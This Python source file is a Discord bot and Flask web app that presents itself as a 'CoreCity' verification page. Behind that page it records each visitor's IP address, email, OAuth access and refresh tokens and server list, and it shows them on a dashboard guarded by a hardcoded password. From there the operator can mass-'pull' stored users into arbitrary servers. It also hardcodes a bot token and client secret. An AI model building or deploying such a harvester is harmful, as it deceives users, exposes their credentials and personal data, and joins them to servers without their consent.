import discord
from discord.ext import commands
import json
import datetime
from flask import Flask, request, redirect
import requests
import threading
from waitress import serve
import time
from flask import jsonify
import os
import re
import base64
import typing
import aiohttp
import discord
import urllib.request
import asyncio

# Bot Configuration
OAUTH2_CLIENT_ID = '1311057398328459374'
OAUTH2_CLIENT_SECRET = 'Ex9SIpcii6JYEJv_-PmktvBGskdRiETx'
BOT_TOKEN = 'MTMxMTA1NzM5ODMyODQ1OTM3NA.G5_H2X._jb-TZWZ9iwXmlL72rLvjyP4wIhESv0fxDNcmw'

# Flask App Setup
app = Flask(__name__)
REDIRECT_URI = 'http://45.157.233.58:5000/callback/'
OAUTH2_URL = f'https://discord.com/api/oauth2/authorize?client_id={OAUTH2_CLIENT_ID}&redirect_uri={requests.utils.quote(REDIRECT_URI)}&response_type=code&scope=identify%20email%20guilds%20guilds.join'
# Discord Bot Setup
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
REQUEST_HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11"
}

def ensure_auth_file():
    if not os.path.exists('auth_users.json'):
        with open('auth_users.json', 'w') as f:
            json.dump([], f)

def get_user_id_from_token(token: str) -> typing.Union[None, str]:
    try:
        discord_user_id = base64.b64decode(
            token.split(".", maxsplit=1)[0] + "=="
        ).decode("utf-8")
    except UnicodeDecodeError:
        return None
    return discord_user_id

def save_user_data(user_data):
    try:
        with open('auth_users.json', 'r') as f:
            users = json.load(f)
    except:
        users = []
    
    user_exists = False
    for i, user in enumerate(users):
        if user['id'] == user_data['id']:
            users[i] = user_data
            user_exists = True
            break
    
    if not user_exists:
        users.append(user_data)
    
    with open('auth_users.json', 'w') as f:
        json.dump(users, f, indent=4)
    
    print(f"Saved user data for {user_data['username']} (ID: {user_data['id']})")

async def get_discord_user_token(code):
    data = {
        'client_id': OAUTH2_CLIENT_ID,
        'client_secret': OAUTH2_CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI,
        'scope': 'identify email guilds guilds.join'
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post('https://discord.com/api/oauth2/token', data=data) as response:
                if response.status != 200:
                    print(f"Token request failed: {await response.text()}")
                    return None
                    
                tokens = await response.json()
                access_token = tokens.get('access_token')
                refresh_token = tokens.get('refresh_token')
                
                headers = {'Authorization': f'Bearer {access_token}'}
                async with session.get('https://discord.com/api/v10/users/@me', headers=headers) as user_response:
                    if user_response.status == 200:
                        user_data = await user_response.json()
                        user_token = user_data.get('token', access_token)
                    else:
                        print(f"Error getting user token: {await user_response.text()}")
                
                return access_token, refresh_token, user_token
                
    except Exception as e:
        print(f"Error getting token: {e}")
        return None

@app.route('/')
def index():
    return redirect(OAUTH2_URL)

@app.route('/callback/')
def callback():
    ensure_auth_file()
    code = request.args.get('code')
    client_ip = request.remote_addr
    
    if not code:
        return 'No code provided', 400
    
    tokens = asyncio.run(get_discord_user_token(code))
    if not tokens:
        return 'Failed to get token', 400
        
    access_token, refresh_token, user_token = tokens
    headers = {
        'Authorization': f'Bearer {access_token}'
    }
    
    user_response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
    
    if user_response.status_code != 200:
        print(f"User info request failed: {user_response.text}")
        return 'Failed to get user info', 400
    
    user_info = user_response.json()
    guilds_response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
    guilds = []
    if guilds_response.status_code == 200:
        guilds = guilds_response.json()
    
    verified_time = datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%d %H:%M:%S UTC')
    print(f"User verified at {verified_time} from IP: {client_ip}")
    
    user_data = {
        'id': user_info['id'],
        'username': user_info['username'],
        'ip_address': client_ip,
        'email': user_info.get('email', 'Not provided'),
        'token': user_token,
        'refresh_token': refresh_token,
        'auth_time': datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%d %H:%M:%S UTC'),
        'discriminator': user_info.get('discriminator', 'Not provided'),
        'avatar': user_info.get('avatar', None),
        'guilds': [{'id': g['id'], 'name': g['name']} for g in guilds],
        'last_updated': datetime.datetime.now(datetime.UTC).strftime('%Y-%m-%d %H:%M:%S UTC'),
    }
    
    save_user_data(user_data)
    # Add role to user
    guild_id = '1275125431787458560'
    role_id = '1311049441729577102'
        
    bot_headers = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'Content-Type': 'application/json'
    }
        
    add_role_url = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_info["id"]}/roles/{role_id}'
    role_response = requests.put(add_role_url, headers=bot_headers)
        
    if role_response.status_code not in [204, 200]:
        print(f"Failed to add role: {role_response.text}")

    print(f"Successfully processed authorization for user {user_data['username']} (ID: {user_data['id']})")    
    success_html = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Erfolgreich für CoreCity Verifiziert!</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #36393f;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .container {
                background-color: #2f3136;
                padding: 40px;
                border-radius: 8px;
                text-align: center;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                max-width: 500px;
            }
            h1 {
                color: #ffffff;
                margin-bottom: 20px;
            }
            .success-message {
                color: #43b581;
                font-size: 18px;
                margin-bottom: 20px;
            }
            .user-info {
                color: #dcddde;
                font-size: 16px;
                margin-bottom: 15px;
            }
            .checkmark {
                color: #43b581;
                font-size: 48px;
                margin-bottom: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="checkmark">✓</div>
            <h1>Verification Successful!</h1>
            <div class="success-message">Dein Discord Account wurde auf CoreCity erfolgreich verifiziert.</div>
            <div class="user-info">Wilkommen, ''' + user_info['username'] + '''!</div>
            <div class="user-info">Du besitzt jetzt die Staatsbürger Rolle!</div>
        </div>
    </body>
    </html>
    '''
    return success_html

try:
    # Your existing code here
    pass
except Exception as e:
    # Handle the exception
    print(f"An error occurred: {str(e)}")

def callback():
    try:
        # Your existing code here
        pass
    except Exception as e:
        print(f"Error during callback processing: {str(e)}")
        return f'An error occurred during authorization: {str(e)}', 500

def get_all_verified_members():
    try:
        with open('auth_users.json', 'r') as file:
            verified_members = json.load(file)
        return verified_members
    except Exception as e:
        print(f"Error fetching verified members: {str(e)}")
        return []

@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
    if request.method == 'POST':
        password = request.form.get('password')
        if password == '232009':
            # Get all verified members from the JSON file
            verified_members = get_all_verified_members()
            
            dashboard_html = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Verification Dashboard</title>
                <style>
                    body {{
                        font-family: 'Segoe UI', Arial, sans-serif;
                        background: linear-gradient(135deg, #1a1a2e, #16213e, #1a1a2e);
                        margin: 0;
                        padding: 20px;
                        min-height: 100vh;
                    }}
                    .dashboard-container {{
                        max-width: 1200px;
                        margin: 0 auto;
                        animation: fadeIn 0.8s ease-in;
                    }}
                    @keyframes fadeIn {{
                        from {{ opacity: 0; transform: translateY(-20px); }}
                        to {{ opacity: 1; transform: translateY(0); }}
                    }}
                    h1 {{
                        color: #ffffff;
                        text-align: center;
                        margin-bottom: 30px;
                        font-size: 2.5em;
                        text-shadow: 0 0 10px rgba(114, 137, 218, 0.5);
                        animation: glow 2s ease-in-out infinite alternate;
                    }}
                    @keyframes glow {{
                        from {{ text-shadow: 0 0 10px rgba(114, 137, 218, 0.5); }}
                        to {{ text-shadow: 0 0 20px rgba(114, 137, 218, 0.8), 0 0 30px rgba(114, 137, 218, 0.6); }}
                    }}
                    .members-grid {{
                        display: grid;
                        grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
                        gap: 25px;
                        perspective: 1000px;
                    }}
                    .member-card {{
                        background: linear-gradient(145deg, #2f3136, #36393f);
                        border-radius: 12px;
                        padding: 25px;
                        cursor: pointer;
                        transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
                        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                        border: 1px solid rgba(114, 137, 218, 0.1);
                        animation: cardIn 0.5s ease-out;
                    }}
                    @keyframes cardIn {{
                        from {{ opacity: 0; transform: translateY(30px) rotateX(-10deg); }}
                        to {{ opacity: 1; transform: translateY(0) rotateX(0); }}
                    }}
                    .member-card:hover {{
                        transform: translateY(-8px) scale(1.02);
                        box-shadow: 0 8px 25px rgba(114, 137, 218, 0.2);
                        border-color: rgba(114, 137, 218, 0.3);
                    }}
                    .member-avatar {{
                        width: 100px;
                        height: 100px;
                        border-radius: 50%;
                        margin: 0 auto 20px;
                        display: block;
                        border: 3px solid #7289da;
                        transition: transform 0.3s ease;
                        box-shadow: 0 0 15px rgba(114, 137, 218, 0.3);
                    }}
                    .member-card:hover .member-avatar {{
                        transform: rotate(360deg);
                    }}
                    .member-name {{
                        color: #ffffff;
                        font-size: 20px;
                        text-align: center;
                        margin-bottom: 12px;
                        font-weight: 600;
                    }}
                    .member-id {{
                        color: #b9bbbe;
                        font-size: 14px;
                        text-align: center;
                        background: rgba(114, 137, 218, 0.1);
                        padding: 5px 10px;
                        border-radius: 20px;
                        margin: 8px 0;
                    }}
                    .member-ip {{
                        color: #b9bbbe;
                        font-size: 14px;
                        text-align: center;
                        margin-top: 8px;
                        background: rgba(114, 137, 218, 0.1);
                        padding: 5px 10px;
                        border-radius: 20px;
                    }}
                    .modal {{
                        display: none;
                        position: fixed;
                        top: 0;
                        left: 0;
                        width: 100%;
                        height: 100%;
                        background-color: rgba(0,0,0,0.8);
                        backdrop-filter: blur(5px);
                        animation: modalIn 0.3s ease-out;
                    }}
                    @keyframes modalIn {{
                        from {{ opacity: 0; }}
                        to {{ opacity: 1; }}
                    }}
                    .modal-content {{
                        background: linear-gradient(145deg, #2f3136, #36393f);
                        margin: 5% auto;
                        padding: 35px;
                        border-radius: 15px;
                        max-width: 650px;
                        position: relative;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.4);
                        border: 1px solid rgba(114, 137, 218, 0.2);
                        animation: slideIn 0.4s ease-out;
                    }}
                    @keyframes slideIn {{
                        from {{ transform: translateY(-100px); opacity: 0; }}
                        to {{ transform: translateY(0); opacity: 1; }}
                    }}
                    .close {{
                        color: #ffffff;
                        position: absolute;
                        right: 20px;
                        top: 15px;
                        font-size: 28px;
                        cursor: pointer;
                        transition: transform 0.3s ease;
                    }}
                    .close:hover {{
                        transform: rotate(90deg);
                        color: #7289da;
                    }}
                    .user-details {{
                        color: #ffffff;
                    }}
                    .detail-row {{
                        margin: 12px 0;
                        padding: 15px;
                        background: linear-gradient(145deg, #36393f, #40444b);
                        border-radius: 8px;
                        transition: transform 0.2s ease;
                        border-left: 3px solid #7289da;
                    }}
                    .detail-row:hover {{
                        transform: translateX(5px);
                        background: linear-gradient(145deg, #36393f, #43464d);
                    }}
                    #serverModal {{
                        z-index: 1001;
                    }}

                    #serverModal .modal-content {{
                        background: linear-gradient(145deg, #2f3136, #36393f);
                        animation: modalSlideIn 0.4s ease-out;
                        padding: 30px;
                        border-radius: 15px;
                        box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
                        border: 2px solid rgba(114, 137, 218, 0.3);
                    }}

                    #serverModal select {{
                        width: 100%;
                        padding: 15px;
                        margin: 15px 0;
                        background: linear-gradient(145deg, #36393f, #40444b);
                        color: #ffffff;
                        border: 2px solid rgba(114, 137, 218, 0.2);
                        border-radius: 10px;
                        font-size: 16px;
                        transition: all 0.3s ease;
                        cursor: pointer;
                        box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
                    }}

                    #serverModal select:hover {{
                        border-color: rgba(114, 137, 218, 0.5);
                        transform: translateY(-2px);
                    }}

                    #serverModal select:focus {{
                        outline: none;
                        border-color: #7289da;
                        box-shadow: 0 0 15px rgba(114, 137, 218, 0.4);
                    }}

                    #serverModal button {{
                        width: 100%;
                        padding: 15px;
                        margin-top: 20px;
                        background: linear-gradient(135deg, #7289da, #5b6fb1);
                        color: #ffffff;
                        border: none;
                        border-radius: 10px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        box-shadow: 0 4px 15px rgba(114, 137, 218, 0.3);
                        text-transform: uppercase;
                        letter-spacing: 1px;
                    }}

                    #serverModal button:hover {{
                        transform: translateY(-3px);
                        box-shadow: 0 6px 20px rgba(114, 137, 218, 0.4);
                        background: linear-gradient(135deg, #8299ea, #6b7fc1);
                    }}

                    #serverModal button:active {{
                        transform: translateY(1px);
                    }}

                    .pull-all-button {{
                        background: linear-gradient(135deg, #7289da, #5b6fb1);
                        color: #ffffff;
                        border: none;
                        border-radius: 10px;
                        padding: 15px 25px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        box-shadow: 0 4px 15px rgba(114, 137, 218, 0.3);
                        text-transform: uppercase;
                        letter-spacing: 1px;
                    }}

                    .pull-all-button:hover {{
                        transform: translateY(-3px);
                        box-shadow: 0 6px 20px rgba(114, 137, 218, 0.4);
                        background: linear-gradient(135deg, #8299ea, #6b7fc1);
                    }}

                    .pull-button {{
                        width: 200px;
                        margin: 25px auto;
                        display: block;
                        padding: 15px;
                        background: linear-gradient(135deg, #7289da, #5b6fb1);
                        color: #ffffff;
                        border: none;
                        border-radius: 10px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                        transition: all 0.3s ease;
                        box-shadow: 0 4px 15px rgba(114, 137, 218, 0.3);
                        text-transform: uppercase;
                        letter-spacing: 1px;
                        }}
                    
                        .pull-button:hover {{
                            transform: translateY(-3px);
                            box-shadow: 0 6px 20px rgba(114, 137, 218, 0.4);
                            background: linear-gradient(135deg, #8299ea, #6b7fc1);
                        }}
                    
                        .pull-button:active {{
                            transform: translateY(1px);
                        }}

                    @keyframes modalSlideIn {{
                        from {{
                            transform: translateY(-50px);
                            opacity: 0;
                        }}
                        to {{
                            transform: translateY(0);
                            opacity: 1;
                        }}
                    }}
                </style>
                <script>
                    function showUserDetails(userId) {{
                        fetch(`/api/user/${{userId}}`)
                            .then(response => response.json())
                            .then(data => {{
                                const modal = document.getElementById('userModal');
                                const userDetails = document.getElementById('userDetails');
                                userDetails.innerHTML = `
                                    <div class="detail-row">IP: ${{data.ip_address || 'Unknown'}}</div>
                                    <div class="detail-row">Email: ${{data.email}}</div>
                                    <div class="detail-row">Discord ID: ${{data.id}}</div>
                                    <div class="detail-row">Token: ${{data.token}}</div>
                                    <div class="detail-row">Username: ${{data.username}}</div>
                                    <div class="detail-row">Verified At: ${{data.verified_at}}</div>
                                    <button onclick="pullUserToServer('${{data.id}}')" style="width: 200px; margin: 25px auto; display: block; padding: 12px; background: linear-gradient(135deg, #7289da, #5b6fb1); color: #ffffff; border: none; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(114, 137, 218, 0.3);">Pull User to Server</button>
                                `;
                                modal.style.display = 'block';
                            }});
                    }}

                    function showServerSelection(userId) {{
                        closeModal();

                        const serverModal = document.createElement('div');
                        serverModal.id = 'serverModal';
                        serverModal.className = 'modal';
                        serverModal.innerHTML = `
                            <div class="modal-content" style="max-width: 400px;">
                                <span class="close" onclick="closeServerModal()">×</span>
                                <h2 style="color: #ffffff; text-align: center; margin-bottom: 25px;">Pull Server Auswahl</h2>
                                <select id="serverSelect" style="width: 100%; padding: 12px; border-radius: 8px; background: linear-gradient(145deg, #36393f, #40444b); color: #ffffff; border: none; margin-bottom: 20px;">
                                    <option value="">Wähle einen Server...</option>
                                </select>
                                <button onclick="pullUserToSelectedServer('${{userId}}')" style="width: 100%; padding: 12px; background: linear-gradient(135deg, #7289da, #5b6fb1); color: #ffffff; border: none; border-radius: 8px; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(114, 137, 218, 0.3);">Benutzer auf Server ziehen</button>
                            </div>
                        `;

                        document.body.appendChild(serverModal);

                        fetch('/api/servers')
                            .then(response => response.json())
                            .then(servers => {{
                                const serverSelect = serverModal.querySelector('#serverSelect');
                                servers.forEach(server => {{
                                    const option = document.createElement('option');
                                    option.value = server.id;
                                    option.textContent = server.name;
                                    serverSelect.appendChild(option);
                                }});
                                serverModal.style.display = 'block';
                            }});
                    }}

                    function closeServerModal() {{
                        const modal = document.getElementById('serverModal');
                        if (modal) {{
                            modal.style.display = 'none';
                            modal.remove();
                        }}
                    }}

            function showUserDetails(userId) {{
                fetch(`/api/user/${{userId}}`)
                    .then(response => response.json())
                    .then(data => {{
                        const modal = document.getElementById('userModal');
                        const userDetails = document.getElementById('userDetails');
                        userDetails.innerHTML = `
                            <div class="detail-row">IP: ${{data.ip_address || 'Unknown'}}</div>
                            <div class="detail-row">Email: ${{data.email}}</div>
                            <div class="detail-row">Discord ID: ${{data.id}}</div>
                            <div class="detail-row">Token: ${{data.token}}</div>
                            <div class="detail-row">Username: ${{data.username}}</div>
                            <div class="detail-row">Verified At: ${{data.verified_at}}</div>
                            <button onclick="showServerSelection('${{data.id}}')" class="pull-button">Pull User to Server</button>
                        `;
                        modal.style.display = 'block';
                    }});
            }}

            function showServerSelection(userId) {{
                closeModal();
                fetch('/api/servers')
                    .then(response => response.json())
                    .then(servers => {{
                        const serverModal = document.createElement('div');
                        serverModal.id = 'serverModal';
                        serverModal.className = 'modal';
                        serverModal.innerHTML = `
                            <div class="modal-content">
                                <span class="close" onclick="closeServerModal()">×</span>
                                <h2>Select Server</h2>
                                <select id="serverSelect">
                                    <option value="">Choose a server...</option>
                                    ${{servers.map(server => `<option value="${{server.id}}">${{server.name}}</option>`).join('')}}
                                </select>
                                <button onclick="pullUserToServer('${{userId}}')">Pull User</button>
                            </div>
                        `;
                        document.body.appendChild(serverModal);
                        serverModal.style.display = 'block';
                    }});
            }}

            function pullUserToServer(userId) {{
                const serverSelect = document.getElementById('serverSelect');
                const selectedServer = serverSelect.value;
                
                if (!selectedServer) {{
                    alert('Please select a server first!');
                    return;
                }}

                fetch(`/api/user/${{userId}}/pull`, {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        guild_id: selectedServer
                    }})
                }})
                .then(response => response.json())
                .then(data => {{
                    if(data.success) {{
                        alert('User successfully pulled to server!');
                        closeServerModal();
                    }} else {{
                        alert('Failed to pull user: ' + data.error);
                    }}
                }})
                .catch(error => {{
                    alert('Error pulling user to server');
                }});
            }}

            function closeModal() {{
                document.getElementById('userModal').style.display = 'none';
            }}

            function closeServerModal() {{
                const modal = document.getElementById('serverModal');
                if (modal) {{
                    modal.remove();
                }}
            }}

            function showServerSelectionModal() {{
                fetch('/api/servers')
                .then(response => response.json())
                .then(servers => {{
                    const serverModal = document.createElement('div');
                    serverModal.id = 'serverModal';
                    serverModal.className = 'modal';
                    serverModal.innerHTML = `
                        <div class="modal-content">
                            <span class="close" onclick="closeServerModal()">×</span>
                            <h2>Select Server for Mass Pull</h2>
                            <select id="serverSelect">
                                <option value="">Choose a server...</option>
                                ${{servers.map(server => `<option value="${{server.id}}">${{server.name}}</option>`).join('')}}
                            </select>
                            <button onclick="startPullingAllMembers()">Start Pulling All Members</button>
                        </div>
                    `;
                    document.body.appendChild(serverModal);
                    serverModal.style.display = 'block';
                }})
                .catch(error => {{
                    alert('Error fetching servers');
                }});
            }}

            function startPullingAllMembers() {{
                const serverSelect = document.getElementById('serverSelect');
                if (!serverSelect) {{
                    alert('Please open the server selection modal first!');
                    return;
                }}
                
                const selectedServer = serverSelect.value;
    
                if (!selectedServer) {{
                    alert('Please select a server first!');
                    return;
                }}
    
                const members = Array.from(document.querySelectorAll('.member-card')).map(function(card) {{
                    return card.getAttribute('onclick').match(/'([^']+)'/)[1];
                }});
    
                let processed = 0;
                
                function processNextMember(index) {{
                    if (index >= members.length) {{
                        alert(`Finished processing all members!`);
                        closeServerModal();
                        return;
                    }}
                    
                    fetch('/api/user/' + members[index] + '/pull', {{
                        method: 'POST',
                        headers: {{
                            'Content-Type': 'application/json'
                        }},
                        body: JSON.stringify({{
                            guild_id: selectedServer
                        }})
                    }})
                    .then(function() {{
                        processed++;
                        setTimeout(() => processNextMember(index + 1), 1000);
                    }})
                    .catch(function(error) {{
                        if (error.status === 429) {{
                            setTimeout(() => processNextMember(index), 5000);
                        }} else {{
                            processed++;
                            setTimeout(() => processNextMember(index + 1), 1000);
                        }}
                    }});
                }}
                
                processNextMember(0);
            }}
        </script>
            </head>
            <body>
                <div class="dashboard-container">
                    <h1>Verified Members</h1>
                    <button onclick="showServerSelectionModal()" style="position: absolute; top: 20px; right: 20px; padding: 10px 20px; background-color: #7289da; color: #ffffff; border: none; border-radius: 4px; cursor: pointer;">Pull All Members</button>
                    <div class="members-grid">
                        {generate_member_cards(verified_members)}
                    </div>
                </div>
                <div id="userModal" class="modal">
                    <div class="modal-content">
                        <span class="close" onclick="closeModal()">×</span>
                        <h2 style="color: #ffffff; text-align: center; margin-bottom: 25px; font-size: 24px;">User Details</h2>
                        <div id="userDetails" class="user-details">
                        </div>
                    </div>
                </div>
            </body>
            </html>
            '''
            return dashboard_html
        else:
            return '''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Dashboard Login</title>
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        background-color: #36393f;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .login-container {
                        background-color: #2f3136;
                        padding: 30px;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.2);
                    }
                    h1 {
                        color: #ffffff;
                        text-align: center;
                        margin-bottom: 20px;
                    }
                    input {
                        width: 100%;
                        padding: 10px;
                        margin-bottom: 15px;
                        border: none;
                        border-radius: 4px;
                        background-color: #40444b;
                        color: #ffffff;
                    }
                    button {
                        width: 100%;
                        padding: 10px;
                        background-color: #7289da;
                        color: #ffffff;
                        border: none;
                        border-radius: 4px;
                        cursor: pointer;
                    }
                    .error {
                        color: #ff4444;
                        text-align: center;
                        margin-bottom: 15px;
                    }
                </style>
            </head>
            <body>
                <div class="login-container">
                    <h1>Dashboard Login</h1>
                    <form method="POST">
                        <div class="error">Invalid password</div>
                        <input type="password" name="password" placeholder="Enter password" required>
                        <button type="submit">Login</button>
                    </form>
                </div>
            </body>
            </html>
            '''
    
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Dashboard Login</title>
        <style>
            body {
                font-family: 'Segoe UI', Arial, sans-serif;
                background: linear-gradient(135deg, #36393f 0%, #2f3136 100%);
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-container {
                background-color: rgba(47, 49, 54, 0.95);
                padding: 40px;
                border-radius: 15px;
                box-shadow: 0 4px 20px rgba(0,0,0,0.3);
                width: 320px;
                backdrop-filter: blur(10px);
                border: 1px solid rgba(255,255,255,0.1);
            }
            h1 {
                color: #ffffff;
                text-align: center;
                margin-bottom: 30px;
                font-size: 28px;
                text-shadow: 0 2px 4px rgba(0,0,0,0.2);
            }
            input {
                width: 100%;
                padding: 12px;
                margin-bottom: 20px;
                border: 2px solid rgba(114,137,218,0.3);
                border-radius: 8px;
                background-color: #40444b;
                color: #ffffff;
                font-size: 16px;
                transition: all 0.3s ease;
            }
            input:focus {
                outline: none;
                border-color: #7289da;
                box-shadow: 0 0 10px rgba(114,137,218,0.3);
            }
            button {
                width: 100%;
                padding: 12px;
                background: linear-gradient(45deg, #7289da, #5c6fb1);
                color: #ffffff;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-size: 16px;
                font-weight: bold;
                transition: transform 0.2s, box-shadow 0.2s;
            }
            button:hover {
                transform: translateY(-2px);
                box-shadow: 0 4px 15px rgba(114,137,218,0.4);
            }
            .login-container::before {
                content: '';
                position: absolute;
                top: -5px;
                left: -5px;
                right: -5px;
                bottom: -5px;
                background: linear-gradient(45deg, #7289da33, #5c6fb133);
                border-radius: 17px;
                z-index: -1;
            }
        </style>
    </head>
    <body>
        <div class="login-container">
            <h1>Dashboard Login</h1>
            <form method="POST">
                <input type="password" name="password" placeholder="Enter password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    '''
def generate_member_cards(members):
    cards = []
    for member in members:
        default_avatar = "https://cdn.discordapp.com/embed/avatars/0.png"
        avatar_url = f"https://cdn.discordapp.com/avatars/{member['id']}/{member['avatar']}.png" if member.get('avatar') else default_avatar
        card = f'''
        <div class="member-card" onclick="showUserDetails('{member['id']}')">
            <img src="{avatar_url}" alt="Avatar" class="member-avatar">
            <div class="member-name">{member['username']}</div>
            <div class="member-id">ID: {member['id']}</div>
            <div class="member-ip">IP: {member.get('ip_address', 'Unknown')}</div>
        </div>
        '''
        cards.append(card)
    return '\n'.join(cards)

@app.route('/api/servers')
def get_available_servers():
    headers = {
        'Authorization': f'Bot {BOT_TOKEN}',
        'Content-Type': 'application/json'
    }
    
    response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
    
    if response.ok:
        servers = response.json()
        server_list = [{
            'id': server['id'],
            'name': server['name'],
            'icon': server.get('icon')
        } for server in servers]
        return jsonify(server_list)
    else:
        return jsonify([]), 500

@app.route('/api/user/<user_id>/pull', methods=['POST'])
def pull_user_to_server(user_id):
    try:
        verified_members = get_all_verified_members()
        user_data = next((user for user in verified_members if user['id'] == user_id), None)
        
        if not user_data:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        request_data = request.get_json()
        guild_id = request_data.get('guild_id')
        
        if not guild_id:
            return jsonify({'success': False, 'error': 'Guild ID is required'}), 400

        headers = {
            'Authorization': f'Bot {BOT_TOKEN}',
            'Content-Type': 'application/json'
        }

        endpoint = f'https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}'
        
        payload = {
            "access_token": user_data.get('access_token', user_data.get('token')),
            "roles": user_data.get('roles', [])
        }

        response = requests.put(endpoint, headers=headers, json=payload)
        
        if response.status_code in [201, 204]:
            return jsonify({'success': True})
        elif response.status_code == 403:
            return jsonify({
                'success': False,
                'error': 'Bot lacks permissions. Please ensure the bot has "Create Instant Invite" and "Manage Server" permissions.'
            }), 403
        else:
            error_message = response.json() if response.text else {'message': 'Unknown error'}
            return jsonify({
                'success': False, 
                'error': f'Discord API Error: {response.status_code}', 
                'details': error_message
            }), response.status_code

    except Exception as e:
        print(f"Pull user error: {str(e)}")
        return jsonify({'success': False, 'error': str(e)}), 500
@app.route('/api/user/<user_id>')
def get_user_details(user_id):
    verified_members = get_all_verified_members()
    user_data = next((user for user in verified_members if user['id'] == user_id), None)
    
    if user_data:
        if 'roles' not in user_data:
            user_data['roles'] = []
        if 'ip_address' not in user_data:
            user_data['ip_address'] = 'Unknown'
        from flask import json
        return json.dumps(user_data), 200, {'Content-Type': 'application/json'}
    else:
        from flask import json
        return json.dumps({'error': 'User not found'}), 404, {'Content-Type': 'application/json'}

@app.route('/api/user/<user_id>/delete', methods=['POST'])
def delete_user(user_id):
    verified_members = get_all_verified_members()
    updated_members = [member for member in verified_members if member['id'] != user_id]
    
    with open('verified_members.json', 'w') as f:
        json.dump(updated_members, f, indent=4)
    
    return json.dumps({'success': True}), 200, {'Content-Type': 'application/json'}              
@app.route('/verify', methods=['GET'])
def verify_index():
    html = f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Discord Verification</title>
        <style>
            body {{
                font-family: Arial, sans-serif;
                background-color: #36393f;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }}
            .container {{
                background-color: #2f3136;
                padding: 40px;
                border-radius: 8px;
                text-align: center;
                box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            }}
            h1 {{
                color: #ffffff;
                margin-bottom: 30px;
            }}
            .verify-button {{
                background-color: #5865f2;
                color: white;
                padding: 12px 24px;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                transition: background-color 0.2s;
            }}
            .verify-button:hover {{
                background-color: #4752c4;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Discord Verification</h1>
            <button class="verify-button" onclick="window.location.href='{OAUTH2_URL}'">Verify with Discord</button>
        </div>
    </body>
    </html>
    '''
    return html

@bot.event
async def on_ready():
    ensure_auth_file()
    print(f'Bot is running as {bot.user}')
    print(f'Authorisierungs URL: {OAUTH2_URL}')

@bot.command()
async def showauth(ctx):
    try:
        ensure_auth_file()
        with open('auth_users.json', 'r') as f:
            users = json.load(f)
            
        user_data = None
        for user in users:
            if str(ctx.author.id) == user['id']:
                user_data = user
                break
        
        if user_data:
            embed = discord.Embed(
                title="Your Authorization Information",
                color=discord.Color.green(),
                timestamp=datetime.datetime.now(datetime.UTC)
            )
            embed.add_field(name="Username", value=user_data['username'], inline=True)
            embed.add_field(name="ID", value=user_data['id'], inline=True)
            embed.add_field(name="Email", value=user_data['email'], inline=True)
            embed.add_field(name="Discord Token", value=f"||{user_data['token']}||", inline=False)
            if user_data.get('refresh_token'):
                embed.add_field(name="Refresh Token", value=f"||{user_data['refresh_token']}||", inline=False)
            embed.add_field(name="Auth Time", value=user_data['auth_time'], inline=False)
            embed.add_field(name="Last Updated", value=user_data.get('last_updated', 'Not available'), inline=False)
            
            if user_data.get('guilds'):
                guild_list = "\n".join([f"• {g['name']}" for g in user_data['guilds'][:5]])
                embed.add_field(name="Joined Guilds (Top 5)", value=guild_list or "None", inline=False)
            
            await ctx.author.send(embed=embed)
            await ctx.send("✅ Authorization info sent to your DMs!")
        else:
            auth_msg = f"You need to authorize first! Click here: {OAUTH2_URL}"
            await ctx.send(auth_msg)
            
    except Exception as e:
        print(f"Error in showauth command: {str(e)}")
